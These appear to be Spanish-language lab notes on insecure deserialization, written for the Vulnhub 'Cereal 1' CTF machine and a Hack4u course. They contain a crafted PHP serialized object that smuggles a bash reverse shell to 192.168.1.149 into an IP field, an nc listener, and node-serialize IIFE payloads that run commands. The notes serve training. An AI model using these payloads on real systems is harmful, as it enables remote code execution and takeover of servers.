---
tags:
  - Web
  - Explotacion
  - "#Deserización"
---

# Notas

El atacante para explotar esta vulnerabilidad lo que hace es modificar los datos del objeto serializado que se pasa al back de la página, consiguiendo así un cambio del comportamiento de la página. 

## PHP

Si interceptamos la petición vemos que se esta pasando un objeto.

```http
POST / HTTP/1.1
Host: secure.cereal.ctf:44441
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://secure.cereal.ctf:44441/
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: http://secure.cereal.ctf:44441
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

obj=O%3A8%3A%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A9%3A%22127.0.0.1%22%3B%7D&ip=127.0.0.1
```

Esta URL encodeado.

```
obj=O:8:"pingTest":1:{s:9:"ipAddress";s:9:"127.0.0.1";}&ip=127.0.0.1
```

Ahora tenemos que buscar el código fuente para ver como trata de serializar el objeto para nosotros poder modificarlo para vulnerar la web.

Podemos realizar dos cosas:
- Visualizar los scripts de la página web donde estamos
	- `(Ctrl + u) para ver el código de la página`
- Enumerar correctamente para ver archivos
	- Diccionarios grandes
	- Extensiones de todo tipo (desde .php hasta php.bak)


**CUANDO TENEMOS LOCALIZADO YA EL CÓDIGO**

Interpretamos lo que esta realizando y dependiendo de como lo trate, podemos realizar el ataque.

Por ejemplo:
Vemos que aquí tiene una validación la cual previamente tiene el valor `False`
Solamente realiza la función si esta variable esta en true.

Por lo tanto podemos enviar el objeto con este valor a True inicialmente, por lo que realizara el comando pasando la validación.

```php
class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";

	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();

	}

	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }

}
```


**Manipulación del objeto:**

Creamos un archivo con la clase por ejemplo `serialize.php`

```php
<?php

class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";
}
```

Y ponemos lo siguiente para que nos lo muestre por consola:

```php
<?php

class pingTest {
	public $ipAddress = ";bash -c 'bash -i >& /dev/tcp/192.168.1.149/433 0>&1'";
	public $isValid = True;
	public $output = "";
}

echo urlencode(serialize(new pingTest));
```

Realizamos el siguiente comando por consola y nos muestra el objeto ya modificado

```bash
php serialize.php 2>/dev/null; echo

#SALIDA
O%3A8%3A%22pingTest%22%3A3%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A53%3A%22%3Bbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.149%2F433+0%3E%261%27%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3Bs%3A6%3A%22output%22%3Bs%3A0%3A%22%22%3B%7D
```

Previamente para capturar la bash:

```shell
nc -nlvp 443
```

## NodeJS

Para NodeJS hay una técnica llamada

**IIFE -> Immediately Invoked Funtion Expression**

Esto consiste en agregar a un objeto serielizado unos paréntesis al final para que en el momento de unserialize, haga primero el comando.

Por ejemplo tenemos lo siguiente:

```js
var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Si le agregamos los paréntesis al final del payload:

```js
var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));```

En la siguiente página hay una herramienta para envío de reverse shell a través de este ataque
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

# Hack4u

Los **ataques de deserialización** son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de **serialización** y **deserialización** de objetos en aplicaciones que utilizan la programación orientada a objetos (**POO**).

La serialización es el proceso de convertir un objeto en una secuencia de **bytes** que puede ser almacenada o transmitida a través de una red. La deserialización es el proceso inverso, en el que una secuencia de bytes es convertida de nuevo a un objeto. Los ataques de deserialización ocurren cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a la **ejecución de código malicioso** en el servidor.

Los ataques de deserialización pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras, como:

- Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso.
- Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.
- Realizar un ataque de “**man-in-the-middle**” para interceptar y modificar el objeto serializado antes de que llegue a la aplicación.

Los ataques de deserialización pueden ser muy peligrosos, ya que pueden permitir que un atacante tome el control completo del servidor o la aplicación que está siendo atacada.

Para evitar estos ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserialización seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para corregir posibles vulnerabilidades.

A continuación se os proporciona el enlace directo a la máquina de Vulnhub donde explotamos un ‘**PHP Deserialization Attack**‘:

- **Máquina Cereal 1**: [https://www.vulnhub.com/entry/cereal-1,703/](https://www.vulnhub.com/entry/cereal-1,703/)

# Laboratorios

## NodeJS

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

Pasos a seguir después de crear el server.js con el contenido de la página.

```bash
node server.js
npm install express node-serialize cookie-parser
node server.js
```

Ya esta corriendo un servidor por el puerto 3000

Creamos un nuevo archivo `serialize.js`

```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

```bash
node serialize.js
```


Creamos ahora el archivo `unserialize.js`

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```




# Máquinas

A continuación se os proporciona el enlace directo a la máquina de Vulnhub donde explotamos un ‘**PHP Deserialization Attack**‘:

- **Máquina Cereal 1**: [https://www.vulnhub.com/entry/cereal-1,703/](https://www.vulnhub.com/entry/cereal-1,703/)